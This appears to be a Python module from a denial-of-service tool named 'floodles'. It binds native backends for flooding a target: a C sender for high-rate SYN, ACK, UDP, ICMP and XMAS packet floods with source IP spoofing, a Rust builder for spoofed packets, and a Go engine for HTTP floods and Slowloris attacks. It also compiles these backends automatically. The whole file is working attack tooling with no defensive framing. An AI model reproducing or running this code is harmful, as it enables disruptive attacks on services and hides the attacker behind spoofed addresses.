"""
core/native_bridge.py
Bridge entre Python et les libs natives (C sender, Rust packets, Go engine).

Priority:
  1. C sender (libsender.so)     -> max PPS raw flood
  2. Rust packets (libfloodles_packets.so) -> fast packet craft
  3. Go engine (floodles-engine binary)    -> max HTTP/Slowloris concurrency
  4. Python fallback              -> toujours disponible

Auto-detection: cherche les libs dans native/c/ et native/rust/target/release/
Compile automatiquement si les sources sont là mais pas les binaires.
"""

import ctypes
import os
import subprocess
import shutil
from pathlib import Path
from typing import Optional


# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------

BASE_DIR     = Path(__file__).parent.parent
NATIVE_C     = BASE_DIR / "native" / "c"
NATIVE_RUST  = BASE_DIR / "native" / "rust"
NATIVE_GO    = BASE_DIR / "native" / "go"

LIB_C_PATH   = NATIVE_C / "libsender.so"
LIB_RUST_PATH = NATIVE_RUST / "target" / "release" / "libfloodles_packets.so"
GO_BIN_PATH  = NATIVE_GO / "floodles-engine"


# ---------------------------------------------------------------------------
# Auto-compilation
# ---------------------------------------------------------------------------

def _try_compile_c() -> bool:
    """Try to compile libsender.so if gcc is available."""
    if not shutil.which("gcc"):
        return False
    try:
        result = subprocess.run(
            ["make", "libsender.so"],
            cwd=NATIVE_C,
            capture_output=True,
            timeout=30,
        )
        return result.returncode == 0
    except Exception:
        return False


def _try_compile_rust() -> bool:
    """Try to compile Rust packet lib if cargo is available."""
    if not shutil.which("cargo"):
        return False
    try:
        result = subprocess.run(
            ["cargo", "build", "--release"],
            cwd=NATIVE_RUST,
            capture_output=True,
            timeout=120,
        )
        return result.returncode == 0
    except Exception:
        return False


def _try_compile_go() -> bool:
    """Try to compile Go engine binary if go is available."""
    if not shutil.which("go"):
        return False
    try:
        result = subprocess.run(
            ["go", "build", "-ldflags=-s -w", "-o", "floodles-engine", "."],
            cwd=NATIVE_GO,
            capture_output=True,
            timeout=60,
        )
        return result.returncode == 0
    except Exception:
        return False


# ---------------------------------------------------------------------------
# C Sender bridge
# ---------------------------------------------------------------------------

class CSenderBridge:
    """
    ctypes wrapper around libsender.so.

    Exposes:
      flood_start(dst_ip, port, threads, pps_limit, duration, pkt_type, spoof)
      flood_stop()
      flood_stats() -> dict
    """

    PKT_SYN  = 0
    PKT_ACK  = 1
    PKT_UDP  = 2
    PKT_ICMP = 3
    PKT_XMAS = 4

    class _FloodStats(ctypes.Structure):
        _fields_ = [
            ("packets",   ctypes.c_ulong),
            ("bytes",     ctypes.c_ulong),
            ("errors",    ctypes.c_ulong),
            ("elapsed_s", ctypes.c_double),
            ("avg_pps",   ctypes.c_double),
            ("avg_mbps",  ctypes.c_double),
        ]

    def __init__(self, lib_path: Path) -> None:
        self._lib = ctypes.CDLL(str(lib_path))
        self._setup_signatures()

    def _setup_signatures(self) -> None:
        lib = self._lib

        lib.flood_start.argtypes = [
            ctypes.c_char_p,   # dst_ip
            ctypes.c_int,      # port
            ctypes.c_int,      # threads
            ctypes.c_long,     # pps_limit
            ctypes.c_int,      # duration
            ctypes.c_int,      # pkt_type
            ctypes.c_int,      # spoof
        ]
        lib.flood_start.restype = ctypes.c_int

        lib.flood_stop.argtypes  = []
        lib.flood_stop.restype   = None

        lib.flood_stats.argtypes = [ctypes.POINTER(self._FloodStats)]
        lib.flood_stats.restype  = None

    def start(self, dst_ip: str, port: int, threads: int,
              pps_limit: int, duration: int, pkt_type: int, spoof: bool) -> int:
        return self._lib.flood_start(
            dst_ip.encode(), port, threads, pps_limit, duration,
            pkt_type, 1 if spoof else 0,
        )

    def stop(self) -> None:
        self._lib.flood_stop()

    def stats(self) -> dict:
        s = self._FloodStats()
        self._lib.flood_stats(ctypes.byref(s))
        return {
            "packets":   s.packets,
            "bytes":     s.bytes,
            "errors":    s.errors,
            "elapsed_s": round(s.elapsed_s, 2),
            "avg_pps":   round(s.avg_pps, 1),
            "avg_mbps":  round(s.avg_mbps, 3),
        }


# ---------------------------------------------------------------------------
# Rust Packet Builder bridge
# ---------------------------------------------------------------------------

class RustPacketBridge:
    """
    ctypes wrapper around libfloodles_packets.so.
    Replaces Scapy for raw packet craft with zero-copy Rust buffers.
    """

    class _PacketBuf(ctypes.Structure):
        _fields_ = [
            ("data", ctypes.c_uint8 * 1500),
            ("len",  ctypes.c_uint32),
        ]

    def __init__(self, lib_path: Path) -> None:
        self._lib = ctypes.CDLL(str(lib_path))
        self._setup()

    def _setup(self) -> None:
        buf_t = self._PacketBuf

        for fn_name in ("build_syn", "build_ack", "build_rst", "build_xmas"):
            fn = getattr(self._lib, fn_name)
            fn.argtypes = [ctypes.c_uint32, ctypes.c_uint16, ctypes.c_int]
            fn.restype  = buf_t

        self._lib.build_udp.argtypes  = [ctypes.c_uint32, ctypes.c_uint16,
                                          ctypes.c_uint32, ctypes.c_int]
        self._lib.build_udp.restype   = buf_t

        self._lib.build_icmp.argtypes = [ctypes.c_uint32, ctypes.c_uint32,
                                         ctypes.c_int]
        self._lib.build_icmp.restype  = buf_t

    def _ip_to_u32(self, ip: str) -> int:
        import socket, struct
        return struct.unpack("!I", socket.inet_aton(ip))[0]

    def _buf_to_bytes(self, buf) -> bytes:
        return bytes(buf.data[:buf.len])

    def syn(self, dst_ip: str, dst_port: int, spoof: bool = True) -> bytes:
        b = self._lib.build_syn(self._ip_to_u32(dst_ip), dst_port, int(spoof))
        return self._buf_to_bytes(b)

    def ack(self, dst_ip: str, dst_port: int, spoof: bool = True) -> bytes:
        b = self._lib.build_ack(self._ip_to_u32(dst_ip), dst_port, int(spoof))
        return self._buf_to_bytes(b)

    def rst(self, dst_ip: str, dst_port: int, spoof: bool = True) -> bytes:
        b = self._lib.build_rst(self._ip_to_u32(dst_ip), dst_port, int(spoof))
        return self._buf_to_bytes(b)

    def xmas(self, dst_ip: str, dst_port: int, spoof: bool = True) -> bytes:
        b = self._lib.build_xmas(self._ip_to_u32(dst_ip), dst_port, int(spoof))
        return self._buf_to_bytes(b)

    def udp(self, dst_ip: str, dst_port: int,
            payload_size: int = 512, spoof: bool = True) -> bytes:
        b = self._lib.build_udp(
            self._ip_to_u32(dst_ip), dst_port, payload_size, int(spoof)
        )
        return self._buf_to_bytes(b)

    def icmp_echo(self, dst_ip: str,
                  payload_size: int = 56, spoof: bool = True) -> bytes:
        b = self._lib.build_icmp(
            self._ip_to_u32(dst_ip), payload_size, int(spoof)
        )
        return self._buf_to_bytes(b)


# ---------------------------------------------------------------------------
# Go Engine bridge
# ---------------------------------------------------------------------------

class GoEngineBridge:
    """
    Subprocess wrapper around floodles-engine (Go binary).
    Launches HTTP flood or Slowloris with goroutine engine.
    """

    def __init__(self, bin_path: Path) -> None:
        self._bin  = str(bin_path)
        self._proc: Optional[subprocess.Popen] = None

    def http(self, url: str, method: str = "GET",
             concurrency: int = 1000, duration: int = 30,
             post_size: int = 1024, bust: bool = True) -> None:
        args = [
            self._bin, "http",
            "--url",         url,
            "--method",      method,
            "--concurrency", str(concurrency),
            "--duration",    str(duration),
            "--post-size",   str(post_size),
        ]
        if not bust:
            args.append("--no-bust")
        self._proc = subprocess.Popen(args)

    def slowloris(self, host: str, port: int = 80,
                  sockets: int = 500, duration: int = 60,
                  use_tls: bool = False) -> None:
        args = [
            self._bin, "slow",
            "--host",     host,
            "--port",     str(port),
            "--sockets",  str(sockets),
            "--duration", str(duration),
        ]
        if use_tls:
            args.append("--tls")
        self._proc = subprocess.Popen(args)

    def wait(self) -> None:
        if self._proc:
            self._proc.wait()

    def stop(self) -> None:
        if self._proc:
            self._proc.terminate()
            try:
                self._proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self._proc.kill()

    def is_running(self) -> bool:
        return self._proc is not None and self._proc.poll() is None


# ---------------------------------------------------------------------------
# Auto-detect and load best available backend
# ---------------------------------------------------------------------------

_c_bridge:    Optional[CSenderBridge]    = None
_rust_bridge: Optional[RustPacketBridge] = None
_go_bridge:   Optional[GoEngineBridge]  = None
_detected     = False


def detect(auto_compile: bool = True, verbose: bool = False) -> dict:
    """
    Detect available native backends.
    Returns dict of available components.

    Args:
        auto_compile : Try to compile missing libs if toolchain available.
        verbose      : Print detection status.
    """
    global _c_bridge, _rust_bridge, _go_bridge, _detected
    status = {"c_sender": False, "rust_packets": False, "go_engine": False}

    # --- C sender ---
    if not LIB_C_PATH.exists() and auto_compile:
        if verbose: print("[~] C sender: compiling...")
        _try_compile_c()
    if LIB_C_PATH.exists():
        try:
            _c_bridge = CSenderBridge(LIB_C_PATH)
            status["c_sender"] = True
            if verbose: print("[+] C sender: loaded (sendmmsg batch)")
        except Exception as e:
            if verbose: print(f"[-] C sender: load failed ({e})")

    # --- Rust packets ---
    if not LIB_RUST_PATH.exists() and auto_compile:
        if verbose: print("[~] Rust packets: compiling (may take 30s)...")
        _try_compile_rust()
    if LIB_RUST_PATH.exists():
        try:
            _rust_bridge = RustPacketBridge(LIB_RUST_PATH)
            status["rust_packets"] = True
            if verbose: print("[+] Rust packets: loaded (zero-copy builder)")
        except Exception as e:
            if verbose: print(f"[-] Rust packets: load failed ({e})")

    # --- Go engine ---
    if not GO_BIN_PATH.exists() and auto_compile:
        if verbose: print("[~] Go engine: compiling...")
        _try_compile_go()
    if GO_BIN_PATH.exists():
        _go_bridge = GoEngineBridge(GO_BIN_PATH)
        status["go_engine"] = True
        if verbose: print("[+] Go engine: available (goroutine HTTP/Slowloris)")

    _detected = True

    if verbose:
        if not any(status.values()):
            print("[*] No native libs found. Using pure Python (Scapy) fallback.")
        else:
            active = [k for k, v in status.items() if v]
            print(f"[*] Native backends active: {', '.join(active)}")

    return status


def get_packet_builder():
    """
    Return best available packet builder.
    Priority: Rust > Scapy (Python)
    """
    if not _detected:
        detect(verbose=False)
    if _rust_bridge:
        return _rust_bridge
    from floodles.core.packet_builder import PacketBuilder
    return PacketBuilder()


def get_c_sender() -> Optional[CSenderBridge]:
    if not _detected:
        detect(verbose=False)
    return _c_bridge


def get_go_engine() -> Optional[GoEngineBridge]:
    if not _detected:
        detect(verbose=False)
    return _go_bridge
